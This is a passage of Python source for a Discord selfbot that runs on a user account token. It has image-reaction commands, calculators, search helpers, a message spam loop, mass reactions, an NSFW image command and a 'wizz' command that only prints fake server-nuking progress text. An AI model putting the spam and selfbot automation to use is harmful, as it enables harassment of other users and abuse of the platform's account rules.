        f"**╭・⌬・AniketPlayZX S3LFB0T**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n\n__**[ H 3 L P  COMMAND...  ]**__\n\n**[+]・ `C2I` **\n**[+]・ `I2C` **\n**[+]・ `BANNER` **\n**[+]・ `STREAMING`**\n**[+]・ `WATCHING` **\n**[+]・ `LISTENING` **\n**[+]・ `PLAYING` **\n**[+]・ `STOPACTIVITY` **\n**[+]・ `LINK - NON PREFIX` **\n**[+]・ `SPAM | [+spam <time> <amt.> <msg>]` **\n**[+]・ `MASDMFRIENDS` **\n**[+]・ `MASSREACT` **\n**[+]・ `BOOSTS - NON PREFIX` **\n**[+]・ `LOVERATE` **\n**[+]・ `FEED` **\n**[+]・ `HACK` **\n**[+]・ `GAYRATE` **\n**[+]・ `WIZZ` **\n**[+]・ `INFO - NON PREFIX` **\n**[+]・ `YTSEARCH` **\n**[+]・ `CHECKPROMO` **\n**[+]・ `CATEGORY_RESPONDER` **\n**[+]・ `WAIFU` **\n**[+]・ `IMGSEARCH` **\n**[+]・ `AUTORESPONSE / AUTORESPONSE DISABLE - NON PREFIX` **\n**[+]・ `GUILDICON` **\n**[+]・ `LINK - NON PREFIX` **\n**[+]・ `PURGE` **\n**[+]・ `PREFIX - NON PREFIX` **\n**[+]・ `NITRO` **\n**[+]・ `ADD | FORMAT [ +add 189 78 ]` **\n**[+]・ `SUBTRACT | FORMAT [ +subtact 189 78 ]` **\n**[+]・ `MULTIPLY | FORMAT [ +multiply 189 78 ]` **\n**[+]・ `DIVIDE | FORMAT [ +divide 189 78 ]` **\n**[+]・ `SAVE TRANSCRIPT` **\n**[+]・ `VOUCH - NON PREFIX` **\n**[+]・ `NITRO` **\n\n**・` TYPE [ANTINUKE_HELP] AND [FUN_HELP] FOR THEIR COMMANDS...` **\n\n**[+]・Request creator : `{aniketplyzx.user.name}`**\n__**[+]・Created by - AniketPlyZX **__\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )
    await ctx.send(message)
    print(f"{Fore.GREEN}[+] HELP SENT SUCCESFULLY✅ ")
    await ctx.message.delete()


# ANTINUKE
@aniketplyzx.command()
async def antinuke_help(ctx):
    message = (
        f"**╭・⌬・AniketPlayZX S3LFB0T**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n\n__**[ H 3 L P  COMMAND... = ANTINUKE  ]**__\n\n**[+]・ `ANIKETNUKE TRUE` **\n**[+]・ `ANTINUKE FALSE` **\n**[+]・ `UNWHITELIST` **\n**[+]・ `WHITELIST` **\n**[+]・ `WHITELISTED` **\n**[+]・ `CLEAR WHIELIST`**\n\n**[+]・Request creator : `itx_aniket.98`**\n__**[+]・Created by - AniketPlyZX **__\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**  "
    )
    await ctx.send(message)
    print(f"{Fore.GREEN}[+] ANTI-HELP SENT SUCCESFULLY✅ ")
    await ctx.message.delete()


# FUN
@aniketplyzx.command()
async def fun_help(ctx):
    message = (
        f"**╭・⌬・AniketPlayZX S3LFB0T**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n\n__**[ H 3 L P  COMMAND... = FUN  ]**__\n\n**[+]・ `PAT` **\n**[+]・ `CUDDLE` **\n**[+]・ `KISS` **\n**[+]・ `SLAP` **\n**[+]・ `FEED` **\n**[+]・ `SMUG`**\n**[+]・ `HUG`**\n\n**[+]・Request creator : `itx_aniket.98`**\n__**[+]・Created by - AniketPlyZX **__\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )
    await ctx.send(message)
    print(f"{Fore.GREEN}[+] FUN-HELP SENT SUCCESFULLY✅ ")
    await ctx.message.delete()


# GAYRATE
@aniketplyzx.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def gayrate(ctx, User: discord.Member = None):
    if User is None:
        await ctx.reply(f"- **[+]** `PROVIDE A USER`")
    else:
        await ctx.reply(f"> {User.mention} IS {random.randrange(101)}% GAY")
        print(f"{Fore.GREEN}[+] GAYRATE MEASURED SUCCESFULLY😂 ")


# PURGE CMD...
@aniketplyzx.command(aliases=[""])
async def purge(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(
                limit=1000).filter(lambda m: m.author == aniketplyzx.user):
            try:
                await message.delete()
            except discord.Forbidden:
                pass
            except discord.NotFound:
                pass
    else:
        async for message in ctx.message.channel.history(
                limit=amount).filter(lambda m: m.author == aniketplyzx.user):
            try:
                await message.delete()
            except discord.Forbidden:
                pass
            except discord.NotFound:
                pass
    print(f"{Fore.GREEN}[+] PURGED SUCCESFULLY✅ ")


# YT SEARCH
@aniketplyzx.command()
async def ytsearch(msg, *, search=''):

    if search == '':
        await msg.send('- `PROVIDE A REQUEST...`')
    query_string = urllib.parse.urlencode({"search_query": search})
    html_content = urllib.request.urlopen("http://www.youtube.com/results?" +
                                          query_string)
    search_results = re.findall(r"watch\?v=(\S{11})",
                                html_content.read().decode())
    nab = search.replace('@', '')
    await msg.send(
        f"**╭・⌬・AniketPlayZX S3LFB0T **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[+]・ `SEARCH'S FOR` : `{nab}`**\n**[+]・ `URL` : **http://www.youtube.com/watch?v="
        + search_results[0])
    print(f"{Fore.GREEN}[+] YTSEARCH SUCCESSFUL✅ ")


# NUKE
@aniketplyzx.command()
async def wizz(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.TextChannel):
        print("hi")
        initial = random.randrange(0, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`"
        )
    elif isinstance(ctx.message.channel, discord.DMChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`"
        )
    elif isinstance(ctx.message.channel, discord.GroupChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`"
        )
        print(f"{Fore.GREEN}[+] WIZZING SUCCESSFUL✅ ")


# SPAM


@aniketplyzx.command()
async def spam(ctx, amount: int, delay_ms: float, *, message):
    await ctx.message.delete()
    delay_sec = delay_ms / 1000  # Convert milliseconds to seconds
    for _i in range(amount):
        await ctx.send(message)
        await asyncio.sleep(delay_sec)
        print(f"{Fore.GREEN}[+] SPAM SUCCESSFUL✅ ")


# IMAGE SEARCH
@aniketplyzx.command()
async def imgsearch(ctx, *, search=''):
    if search == '':
        await ctx.send('- `PROVIDE A REQUEST...`')
        return

    query_string = urllib.parse.urlencode({"q": search})
    url = f"https://www.google.com/search?{query_string}&tbm=isch"
    headers = {
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }

    try:
        request = urllib.request.Request(url, headers=headers)
        response = urllib.request.urlopen(request)
        html_content = response.read().decode('utf-8')
        img_urls = re.findall(r'"ou":"(.*?)"', html_content)

        if img_urls:
            await ctx.send(f"**╭・⌬・AniketPlayZX S3LFB0T **\n"
                           f"**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n"
                           f"**[+]・ `SEARCH'S FOR` : `{search}`**\n"
                           f"**[+]・ `IMAGE URL` : **{img_urls[0]}")
        else:
            await ctx.send("- `[+] NO IMAGE FOUND...`")
    except Exception as e:
        await ctx.send("- `[+] ERROR SIR`")


# PAT
#Display a pat with a user
@aniketplyzx.command()
async def pat(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_pat.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{Fore.GREEN}[+] PATTED ✅ ")


mainscreen = os.getenv('Token')


# NSFW
@aniketplyzx.command(aliases=['fuck', 'fx', '18+', 'xxx', 'nsfw'])
async def waifu(ctx):
    try:
        response = requests.get('https://api.waifu.pics/nsfw/waifu')
        data = response.json()
        if 'url' in data:
            image_url = data['url']
            await ctx.message.delete()
            await ctx.send(image_url)
        else:
            await ctx.send('- `[+] ERROR FINDING ANIME GURLLL`')
            print(f"{Fore.GREEN}[+] HENTAI  SUCCESSFUL✅ (THARKI💀)")
    except Exception as e:
        print('- `[+] ERROR FETCHING IT`', e)


# KISS
@aniketplyzx.command()
async def kiss(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_kiss.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{Fore.GREEN}[+] KISS  SUCCESSFUL✅ (THARKI💀)")


    # SMUG
@aniketplyzx.command()
async def smug(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_smug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{Fore.GREEN}[+] SUMGGING  SUCCESSFUL✅ ")


#HUG
@aniketplyzx.command()
async def hug(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_hug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{Fore.GREEN}[+] HUGGING  SUCCESSFUL✅ ")


# CUDDLE
@aniketplyzx.command()
async def cuddle(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{Fore.GREEN}[+] CUDDLE  SUCCESSFUL✅ ")


# CHAT TRANSCRIPTION
@aniketplyzx.command()
async def savetranscript(ctx, filename='transcript.txt'):
    try:
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(f'Chat Transcript for {ctx.channel.name}\n')
            file.write('=' * 40 + '\n\n')

            async for message in ctx.channel.history(limit=None):
                file.write(
                    f'Author: {message.author.name}#{message.author.discriminator} ({message.author.id})\n'
                )
                file.write(f'Time: {message.created_at}\n')
                file.write(f'Content: {message.content}\n')
                file.write('=' * 40 + '\n')

            await ctx.send(f'- `[+] SAVED TO` `{filename}`')
    except Exception as e:
        await ctx.send(f'- `[+] ERROR` {e}')


# MASS REACT
@aniketplyzx.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)


# SERVER BANNER
@aniketplyzx.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"- `{ctx.guild.name} SERVER HAS NO BANNER`")
        return
    await ctx.send(ctx.guild.banner_url)
    print(f"{Fore.GREEN}[+] MAREACT  SUCCESSFUL✅ ")


# SERVER PFP
@aniketplyzx.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"- `{ctx.guild.name} SERVER HAS NO ICON`")
        return
    await ctx.send(ctx.guild.icon_url)
    print(f"{Fore.GREEN}[+] GUILDICON SENT  SUCCESSFUL✅ ")


# MASSDM


# SLAP
@aniketplyzx.command()
async def slap(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{Fore.GREEN}[+] SLAPPING  SUCCESSFUL✅ ")


#BACKUP


@aniketplyzx.command()
async def backup(ctx):
    server_info = []
    for guild in ctx.author.guilds:
        try:
            invite = await guild.text_channels[0].create_invite(max_uses=20,
                                                                unique=True)
            server_info.append(
                f"- `SERVER NAME : {guild.name}`\n- `SERVER ID: {guild.id}`\n- `INVITE LINK{invite.url}`\n"
            )
        except discord.errors.Forbidden:
            server_info.append(
                f"- `SERVER NAME : {guild.name}`\n- `SERVER ID: {guild.id}`\n- `INVITE LINK : UNAUTHORISED`\n"
            )
    server_info_message = "\n".join(server_info)
    await ctx.send(f"BACKUP COMPLETE...\n```{server_info_message}```")


# FEED
@aniketplyzx.command()
async def feed(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention,
                           file=discord.File(file, f"astraa_feed.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        print(f"{Fore.GREEN}[+] FEEDING  SUCCESSFUL✅ ")


@aniketplyzx.command()
async def restart(ctx):
    await ctx.reply('- `Restarting...`')
    os.execl(sys.executable, sys.executable, *sys.argv)


@aniketplyzx.command(name='add')
async def add(ctx, num1: float, num2: float):
    result = num1 + num2
    await ctx.send(f'- `ANS : {result}`')


@aniketplyzx.command(name='subtract')
async def subtract(ctx, num1: float, num2: float):
    result = num1 - num2
    await ctx.send(f'- `ANS : {result}`')


@aniketplyzx.command(name='multiply')
async def multiply(ctx, num1: float, num2: float):
    result = num1 * num2
    await ctx.send(f'- `ANS : {result}`')


@aniketplyzx.command(name='divide')
async def divide(ctx, num1: float, num2: float):
    if num2 == 0:
        await ctx.send('- `ERROR`')
    else:
        result = num1 / num2
        await ctx.send(f'- `ANS : {result}`')


token = os.getenv('Token')
aniketplyzx.run(token, bot=False)
